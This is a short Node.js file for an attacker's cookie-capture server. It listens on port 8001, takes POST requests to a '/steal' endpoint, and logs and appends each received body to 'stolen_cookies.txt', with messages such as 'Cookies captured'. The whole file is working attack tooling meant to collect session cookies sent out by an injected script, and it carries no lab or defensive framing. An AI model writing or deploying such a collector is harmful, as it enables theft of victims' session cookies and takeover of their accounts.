const http = require('http');
const fs = require('fs');

// Define the HTTP server
const server = http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/steal') {
    let body = '';
    
    // Collect data from the POST request
    req.on('data', chunk => {
      body += chunk.toString();
    });

    req.on('end', () => {
      console.log('[+] Cookies captured:', body);
      
      // Save the captured data to a file
      fs.appendFile('stolen_cookies.txt', `${body}\n`, err => {
        if (err) {
          console.error('[-] Error saving cookies:', err);
          res.writeHead(500);
          res.end('Failed to save cookies.');
          return;
        }
        console.log('[+] Cookies saved to stolen_cookies.txt');
        res.writeHead(200);
        res.end('Cookies received and logged.');
      });
    });
  } else {
    // Handle invalid routes
    res.writeHead(404);
    res.end('Not Found');
  }
});

// Start the server on port 8001
server.listen(8001, () => {
  console.log('[+] Cookie capture server running on http://localhost:8001');
  console.log('[+] Waiting for cookies...');
});
